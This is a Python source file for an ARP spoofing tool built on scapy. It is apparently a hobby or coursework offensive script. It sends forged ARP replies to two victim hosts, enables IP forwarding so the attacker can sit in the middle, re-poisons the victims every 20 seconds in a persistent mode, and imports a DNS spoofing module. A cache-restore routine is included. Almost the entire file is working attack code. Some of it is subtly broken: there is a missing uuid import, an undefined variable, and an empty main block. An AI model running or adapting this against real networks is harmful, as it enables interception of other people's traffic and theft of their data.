from scapy.all import *
from scapy.layers import *
from scapy.layers.inet import IP
from dns_spoofing import *
import threading
import time
import socket
import nmap
import os
import sys
from getmac import get_mac_address
#from dns_spoofing import settings

from utils.interface import InterfaceConfig

class ARPSpoof:


	def __init__(self, 
			 victim1_ip, 
			 victim2_ip,
			 mitm: bool,
			 restore: bool,
			 duckforce: bool,
		 ):
		 self.victim1_ip = victim1_ip
		 self.victim2_ip = victim2_ip
		 self.mitm = mitm
		 self.restore = restore
		 self.duckforce = duckforce
		 
	def start_attack(self):
		
		if self.mitm:
			print("\n Enabling IP Forwarding (MitM attack)...")
			os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
		else:
			# Disable ip forward
			os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
			
		#get MAC Addresses
		ATTACKER_MAC = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
		VICTIM1_MAC = getmacbyip(self.victim1_ip)
		VICTIM2_MAC = getmacbyip(self.victim2_ip)
		
		#Create packets
		while True:
			#Poisoning the Victim
			arp= Ether() / ARP()
			arp[Ether].src = ATTACKER_MAC
			arp[ARP].hwsrc = ATTACKER_MAC
			arp[ARP].psrc = self.victim2_ip
			arp[ARP].hwdst = VICTIM1_MAC
			arp[ARP].pdst = self.victim1_ip

			sendp(arp, iface='eth0')

			#Poison the Server/Victim2
			arp= Ether() / ARP()
			arp[Ether].src = ATTACKER_MAC
			arp[ARP].hwsrc = ATTACKER_MAC
			arp[ARP].psrc = self.victim1_ip
			arp[ARP].hwdst = VICTIM2_MAC
			arp[ARP].pdst = self.victim2_ip

			sendp(arp, iface='eth0')

			print("(Re-)poisoned the ARP of the following IPs: " + self.victim1_ip +" and "+ self.victim2_ip)
			if self.duckforce == False:
				break
			else: 
				time.sleep(20)
		return
	 	
	def restore_arp(self):
		#get MAC Addresses
		ATTACKER_MAC = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
		VICTIM1_MAC = getmacbyip(self.victim1_ip)
		VICTIM2_MAC = getmacbyip(self.victim2_ip)
		
		#Create packets to 
		# Restore the ARP cache of the Victim
		arp = Ether() / ARP()
		arp[Ether].src = ATTACKER_MAC
		arp[Ether].dst = VICTIM2_MAC
		arp[ARP].hwsrc = VICTIM1_MAC
		arp[ARP].psrc = self.victim1_ip
		arp[ARP].hwdst = VICTIM2_MAC
		arp[ARP].pdst = self.victim2_ip
		sendp(arp, iface='eth0')
		
			# Restore the ARP cache of the Server
		arp = Ether() / ARP()
		arp[Ether].src = ATTACKER_MAC
		arp[Ether].dst = VICTIM1_MAC
		arp[ARP].hwsrc = VICTIM2_MAC
		arp[ARP].psrc = self.victim2_ip
		arp[ARP].hwdst = VICTIM1_MAC
		arp[ARP].pdst = self.victim1_ip
		sendp(arp, iface='eth0')
	
		pass
	 	
	def query_user(self):
		if not victim1_ip:
			pass # ask user for this input
			
if __name__ == "__main__":
	try:
		print("running..")
	except KeyboardInterrupt:
		print('Exiting program arpapr...')
		#restore_arp(self)
		

